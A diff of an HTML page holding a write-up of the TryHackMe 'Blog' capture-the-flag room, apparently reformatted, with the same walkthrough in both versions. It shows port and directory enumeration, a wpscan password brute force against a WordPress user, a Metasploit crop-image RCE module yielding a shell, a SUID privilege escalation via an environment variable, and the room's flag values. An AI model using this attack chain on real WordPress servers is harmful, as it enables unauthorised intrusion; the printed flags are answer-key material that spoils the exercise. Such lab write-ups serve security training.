@@ -1,13 +1,127 @@
-<p><a href="https://tryhackme.com/room/blog">Link to room on TryHackMe.com</a></p>
-<p>Welcome to my TryHackMe-Blog-WriteUp! first we add machines ip adress on our /etc/hosts file as blog.thm: </p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo &quot;10.10.153.19 blog.thm&quot; &gt;&gt; /etc/hosts</code></pre></div>
-<p>after that we start enumeration with rustscan and nmap:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe-Blog-WriteUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white; /* Yazı rengini beyaz yapar */
+        }
+        
+        body {
+            background-image: url('pics/bg5.jpg'); /* Arka plan resmi */
+            background-size: cover; /* Resmi ekran boyutuna göre ayarlar */
+            background-position: center; /* Resmi ortalar */
+            background-repeat: no-repeat; /* Resmin tekrarlanmasını engeller */
+            background-attachment: fixed; /* Arka planın sabit kalmasını sağlar */
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.7); /* Siyah bir örtü ekler */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.3); /* Kırmızı yarı saydam bir arka plan */
+            border-radius: 10px;
+        }
+        
+        .photo-container {
+            margin: 10px 0;
+        }
+        
+        .photo-container img {
+            width: calc(100% - 20px); /* Kenarlarda 20px boşluk bırakır */
+            height: auto; /* En-boy oranını korur */
+            object-fit: cover;
+            border-radius: 0; /* Köşe yuvarlamasını kaldırır */
+            margin: 10px; /* Boşluk ekler */
+        }
+        
+        .photo-container p {
+            font-size: 18px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .code-block {
+            position: relative;
+            background-color: #ffffff;
+            padding: 10px;
+            border-radius: 5px;
+            width: calc(100% - 20px); /* Tam genişlik */
+            margin: 10px; /* Boşluk ekler */
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px; /* Buton yazı boyutunu ayarlar */
+        }
+        
+        .code-block pre {
+            margin: 0;
+            padding: 10px;
+            width: 100%; /* Tam genişlik */
+            white-space: pre; /* Satır kaymasını engeller */
+            font-size: 14px; /* Kod yazı boyutunu ayarlar */
+            color:black;
+            font-family: Arial, sans-serif;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block pre code {
+            display: block;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+            padding: 10px;
+            white-space: nowrap; /* Satır kaymasını engeller */
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="photo-container">
+            <p><a href="https://tryhackme.com/r/room/blog">Link to room on TryHackMe.com</a></p>
+            <p>Welcome to my TryHackMe-Blog-WriteUp! first we add machines ip adress on our /etc/hosts file as blog.thm: </p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo &quot;10.10.153.19 blog.thm&quot; &gt;&gt; /etc/hosts</code></pre></div>
+            <p></p>
+            <p>after that we start enumeration with rustscan and nmap:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[✗]─[root@parrot]─[/home/parrot]
     └──╼ #rustscan -a blog.thm
     .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+    | {}  || { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+    | .-. \| {_} |.-._} } | |  .-._} |\     |/  /\  \| |\  |
     `-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
     The Modern Day Port Scanner.
     ________________________________________
@@ -42,9 +156,9 @@
     Read data files from: /usr/bin/../share/nmap
     Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
     Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
-
-</code></pre>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root@parrot]─[/home/parrot]
     └──╼ #nmap -sC -sV -A -Pn blog.thm -p 22,80
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 17:38 +03
@@ -77,10 +191,10 @@
 
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 43.92 seconds
-
-</code></pre>
-<p>then we see in results only two ports are open. After some research we find out there is no vulnerablity for the services with this versions. So we continue enumaration on port 80 with gobuster:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>   
+            <p>then we see in results only two ports are open. After some research we find out there is no vulnerablity for the services with this versions. So we continue enumaration on port 80 with gobuster:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     ┌─[root@parrot]─[/home/parrot]
     └──╼ #gobuster dir -u http://blog.thm/ -w common.txt -x php,html,txt,old,cgi,js
     ===============================================================
@@ -171,28 +285,40 @@
     ===============================================================
     Finished
     ===============================================================
-
-</code></pre>
-<p>We see there is too much directories. First we go to the robots.txt and we see there is some infos:</p>
-<p><img src="pics/b3.png" alt=""></p>
-<p>After some research we find out when we go to the /wp-admin its redirects us to a wordpress login page. So we found our first flag &quot;What CMS was Billy using?&quot; answer for this question is wordpress. When we try with some common credentials we cant login. So we need a username after some research we find out when we go the <a href="http://blog.thm">http://blog.thm</a> and click comments after that when we click back button on the browser we see something interesting:</p>
-<p><img src="pics/b4.png" alt=""></p>
-<p>So we see there is a author named kwheel. Its Karen Wheeler&#39;s username. When we try for username bjoel its too exists but if we try bruteforce attack for bjoel we cant find password in rockyou.txt  . Then we start a bruteforce attack with wpscan with this command for kwheel:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>wpscan --url http://10.10.35.12/wp-login.php -U kwheel -P /home/parrot/rockyou.txt</code></pre></div>
-<p><img src="pics/b5.png" alt=""></p>
-<p>And then we find the password and during the bruteforce attack wpscan gives us the second flag &quot;What version of the above CMS was being used?&quot;:</p>
-<p><img src="pics/b6.png" alt=""></p>
-<p>When we login with this credentials we see there is no plugins. After some research i found a great exploit for wordpress 5. So we use the exploit  exploit/multi/http/wp_crop_rce . and then we set options like this and run:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set RHOSTS blog.thm</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set USERNAME kwheel</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set PASSWORD cutiepie1</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>run</code></pre></div>
-<p><img src="pics/b7.png" alt=""></p>
-<p>And we see its worked we have a meterpreter shell. Then we use this commands to get a normal shell:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>shell</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;&#39;</code></pre></div>
-<p>After that we are in as user www-data. When we go to the home directory and we see there is a user named bjoel and in bjoel directory there is user.txt but it doesn&#39;t give us a flag:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>We see there is too much directories. First we go to the robots.txt and we see there is some infos:</p>
+            <img src="pics/b3.png" alt="Image 1">
+            <p>After some research we find out when we go to the /wp-admin its redirects us to a wordpress login page. So we found our first flag &quot;What CMS was Billy using?&quot; answer for this question is wordpress. When we try with some common credentials we cant login. So we need a username after some research we find out when we go the <a href="http://blog.thm">http://blog.thm</a> and click comments after that when we click back button on the browser we see something interesting:</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/b4.png" alt="Image 2">
+            <p>So we see there is a author named kwheel. Its Karen Wheeler&#39;s username. When we try for username bjoel its too exists but if we try bruteforce attack for bjoel we cant find password in rockyou.txt  . Then we start a bruteforce attack with wpscan with this command for kwheel:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    wpscan --url http://10.10.35.12/wp-login.php -U kwheel -P /home/parrot/rockyou.txt
+            </code></pre></div>
+            <p></p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/b5.png" alt="Image 3">
+            <p>And then we find the password and during the bruteforce attack wpscan gives us the second flag &quot;What version of the above CMS was being used?&quot;:</p> 
+        </div>
+        <div class="photo-container">
+            <img src="pics/b6.png" alt="Image 4">
+            <p>When we login with this credentials we see there is no plugins. After some research i found a great exploit for wordpress 5. So we use the exploit  exploit/multi/http/wp_crop_rce . and then we set options like this and run:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set RHOSTS blog.thm</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set USERNAME kwheel</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set PASSWORD cutiepie1</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>run</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/b7.png" alt="Image 4">
+            <p>And we see its worked we have a meterpreter shell. Then we use this commands to get a normal shell:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>shell</code></pre></div>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre></div>
+            <p></p>
+            <p>After that we are in as user www-data. When we go to the home directory and we see there is a user named bjoel and in bjoel directory there is user.txt but it doesn&#39;t give us a flag:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     (Meterpreter 2)(/var/www/wordpress) &gt; shell
     Process 6607 created.
     Channel 1 created.
@@ -226,13 +352,13 @@
     You won&#39;t find what you&#39;re looking for here.
 
     TRY HARDER
-    www-data@blog:/home/bjoel$
-
-</code></pre>
-<p>Then we use this command to see which files runs with root privileges:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre></div>
-<p>And we see there is a file called checker:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    www-data@blog:/home/bjoel$   
+            </code></pre></div>
+            <p></p>
+            <p>Then we use this command to see which files runs with root privileges:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre></div>
+            <p>And we see there is a file called checker:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     www-data@blog:/home/bjoel$ find / -perm -u=s -type f 2&gt;/dev/null
     find / -perm -u=s -type f 2&gt;/dev/null
     /usr/bin/passwd
@@ -247,20 +373,20 @@
     /usr/bin/newgidmap
     /usr/bin/traceroute6.iputils
     /usr/sbin/checker
-
-</code></pre>
-<p>When we use command &quot;ltrace checker&quot; to look what this file does we see this output:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>When we use command &quot;ltrace checker&quot; to look what this file does we see this output:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     www-data@blog:/home/bjoel$ ltrace checker
     ltrace checker
     getenv(&quot;admin&quot;)                                  = nil
     puts(&quot;Not an Admin&quot;Not an Admin
     )                             = 13
     +++ exited (status 0) +++
-
-</code></pre>
-<p>What this &quot;checker&quot; is doing is calling a getenv() on &quot;admin&quot; variable and returning its value i.e. &quot;nil&quot;, because the &quot;admin&quot; environment  variable does not exist, so on running &quot;checker&quot; it&#39;s giving the output &quot;Not an admin&quot;.So we can give admin variable any value to exploit the vulnerability of &quot;checker&quot; and get root privileges:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+            </code></pre></div>
+            <p></p>
+            <p>What this &quot;checker&quot; is doing is calling a getenv() on &quot;admin&quot; variable and returning its value i.e. &quot;nil&quot;, because the &quot;admin&quot; environment  variable does not exist, so on running &quot;checker&quot; it&#39;s giving the output &quot;Not an admin&quot;.So we can give admin variable any value to exploit the vulnerability of &quot;checker&quot; and get root privileges:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     www-data@blog:/home/bjoel$ export admin=0
     export admin=0
     www-data@blog:/home/bjoel$ checker
@@ -270,20 +396,25 @@
     root
     root@blog:/home/bjoel#cat /root/root.txt  
     cat /root/root.txt
-    9a0b2b618bef9bfa7ac28c1353d9f318
-
-</code></pre>
-<p>And done. We are root and we get our root flag. For to find where is user.txt we can use this command:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -name &quot;user.txt&quot; 2&gt;/dev/null</code></pre></div>
-<p>Then we see same file name exists in two different locations. In first one we couldn&#39;t find something. Then when we try second file we get our user flag:</p>
-<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    9a0b2b618bef9bfa7ac28c1353d9f318 
+            </code></pre></div>
+            <p></p>
+            <p>And done. We are root and we get our root flag. For to find where is user.txt we can use this command:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -name &quot;user.txt&quot; 2&gt;/dev/null</code></pre></div>
+            <p></p>
+            <p>Then we see same file name exists in two different locations. In first one we couldn&#39;t find something. Then when we try second file we get our user flag:</p>
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
     root@blog:/home/bjoel# find / -name &quot;user.txt&quot; 2&gt;/dev/null
     find / -name &quot;user.txt&quot; 2&gt;/dev/null
     /home/bjoel/user.txt
     /media/usb/user.txt
     root@blog:/home/bjoel# cat /media/usb/user.txt
     cat /media/usb/user.txt
-    c8421899aae571f7af486492b71a8ab7
-
-</code></pre>
-<p>And done we got our last flag. Thanks for reading!</p>
+    c8421899aae571f7af486492b71a8ab7 
+            </code></pre></div>
+            <p></p>
+            <p>And done we got our last flag. Thanks for reading!</p>
+        </div>   
+    </div>
+</body>
+</html>
